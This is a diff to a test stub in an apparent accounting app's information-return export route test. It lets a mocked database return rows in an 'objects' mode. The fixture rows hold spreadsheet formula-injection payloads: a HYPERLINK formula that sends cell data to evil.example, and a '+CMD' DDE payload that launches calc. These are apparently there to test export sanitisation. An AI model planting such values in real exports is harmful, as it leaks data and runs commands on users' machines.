@@ -50,19 +50,20 @@ stubModules({
     "@openbooks/engine/platform/db": `
       const state = globalThis[Symbol.for("openbooks.information-return-export-route-test")]
       export const db = {
-        async execute() {
+        async execute(_query, mode) {
+          const inMode = (result) => (mode === 'objects' ? result.rows : result)
           state.dbCalls++
           if (state.dbCalls === 1) {
-            return { rows: [{
+            return inMode({ rows: [{
               tax_year: 2025,
               form_type: "1099-NEC",
               currency: "USD",
               status: "computed",
               payer_name: '=HYPERLINK("https://evil.example/?x="&A1,"click")',
-            }] }
+            }] })
           }
           if (state.dbCalls === 2) {
-            return { rows: [{
+            return inMode({ rows: [{
               name: "+CMD|' /C calc'!A0",
               display_name: "-2+2",
               tin_last4: "1234",
@@ -80,7 +81,7 @@ stubModules({
               adjustments: {},
               tax_withheld: "0",
               corrected: false,
-            }] }
+            }] })
           }
           throw new Error("unexpected database query")
         },
